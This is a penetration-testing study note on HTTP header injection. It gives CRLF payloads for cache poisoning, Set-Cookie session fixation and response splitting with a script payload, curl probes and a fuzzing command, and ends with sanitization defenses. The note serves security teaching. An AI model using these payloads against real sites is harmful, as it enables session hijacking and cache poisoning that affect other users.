---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.07 HTTP Header Injection"
---

# 10.07 — HTTP Header Injection

## What is HTTP Header Injection?

HTTP Header Injection occurs when user-controlled data is placed into HTTP response headers without sanitization. The attacker injects `\r\n` (CRLF) to add new headers or even craft a fake second HTTP response.

*Note: This is distinct from CRLF Injection (note 09) and XSS via HTTP Response Splitting (07.13) — those focus on the content delivered to users. This note covers all types of header injection and their impacts.*

```
HEADER INJECTION:
  App sets: Location: /page?ref=USER_INPUT
  
  Inject: /page?ref=legitimate%0d%0aX-Injected:evil
  
  Result:
  Location: /page?ref=legitimate
  X-Injected: evil               ← INJECTED HEADER!
```

---

## Types of Header Injection

### 1. Cache Poisoning via Header Injection

```
TARGET: Shared caches (CDN, Varnish, Nginx cache)

ATTACK:
  GET /page?ref=%0d%0aX-Cache-Status:%20HIT HTTP/1.1
  
  Injected response:
  HTTP/1.1 302 Found
  Location: /page?ref=
  X-Cache-Status: HIT    ← INJECTED!
  
  If cache stores this response:
  → All users requesting /page get the cache-poisoned response!
  → Can be combined with malicious content injection!
```

### 2. Session Fixation via Set-Cookie Injection

```
INJECT:
  /login?next=/page%0d%0aSet-Cookie:session=ATTACKER_SESSION_ID
  
  Response:
  HTTP/1.1 302 Found
  Location: /page
  Set-Cookie: session=ATTACKER_SESSION_ID   ← INJECTED!
  
  → Victim's browser sets session to attacker's chosen value!
  → If victim logs in → attacker knows their session ID!
  → Session fixation attack!
```

### 3. Cross-User Defacement (Response Splitting)

```
INJECT FULL SECOND RESPONSE:
  /page?ref=test%0d%0a%0d%0aHTTP%2F1.1%20200%20OK%0d%0aContent-Type:%20text%2Fhtml%0d%0a%0d%0a<html><script>alert(1)</script></html>
  
  → First response: 302/200 (original)
  → Second "response": 200 with injected HTML
  → HTTP pipelining: next request may receive injected response!
```

---

## Common Injection Points

```
HEADERS THAT MAY CONTAIN USER INPUT:
  Location:         (redirect destinations)
  Set-Cookie:       (if user controls cookie values)
  Content-Disposition: (file download names)
  Access-Control-Allow-Origin: (CORS, if dynamic)
  X-Frame-Options:  (if dynamically set from request)
  Refresh:          (meta refresh redirect)
  Link:             (preload headers)
  Content-Type:     (if user-controlled)
```

---

## Finding Header Injection

```bash
# STEP 1: FIND PARAMETERS REFLECTED IN RESPONSE HEADERS:
curl -v "https://target.com/redirect?url=https://google.com" 2>&1 | grep -i "location"
# Location: https://google.com ← user input in header!

# STEP 2: INJECT CRLF:
curl -v "https://target.com/redirect?url=https://google.com%0d%0aX-Injected:test" 2>&1 | grep -i "x-injected"
# X-Injected: test ← INJECTION CONFIRMED!

# STEP 3: TEST VARIOUS ENCODING:
%0d%0a     = \r\n (standard)
%0a        = \n only
%0d        = \r only
%E5%98%8A  = unicode that some parsers normalize to \n
%E5%98%8D  = unicode normalized to \r

# AUTOMATED — CRLFUZZ:
crlfuzz -u "https://target.com/redirect?url=FUZZ"
```

---

## Impact Assessment

```
IMPACT BY INJECTION TYPE:
  
  X-Cache-Status injection:    MEDIUM (cache confusion)
  Set-Cookie injection:        HIGH (session fixation)
  Location injection:          HIGH (open redirect + phishing)
  XSS via response splitting:  HIGH (code execution)
  Cache poisoning:             CRITICAL (affects all users)
  
SEVERITY: Medium to Critical depending on what can be injected
```

---

## Defense

```
STRIP CRLF FROM ALL VALUES IN HTTP HEADERS:
  Python:
    value = value.replace('\r', '').replace('\n', '')
  
  Java:
    value = value.replaceAll("[\r\n]", "");
  
  PHP:
    $value = str_replace(["\r", "\n"], '', $value);
  
  Web Frameworks (usually handle this automatically):
    Django: header values strip \n by default
    Rails: same
    Express: sanitizes headers
    Spring: sanitizes Location header

ADDITIONAL:
  Validate redirect URLs to same-origin only
  Use fixed cookie names/values
  Implement proper CORS policy (don't reflect Origin blindly)
```

---

## Related Notes
- [[09 - CRLF Injection]] — dedicated CRLF injection note
- [[13 - XSS via HTTP Response Splitting]] — XSS via header injection
- [[06 - Email Header Injection]] — email-specific header injection
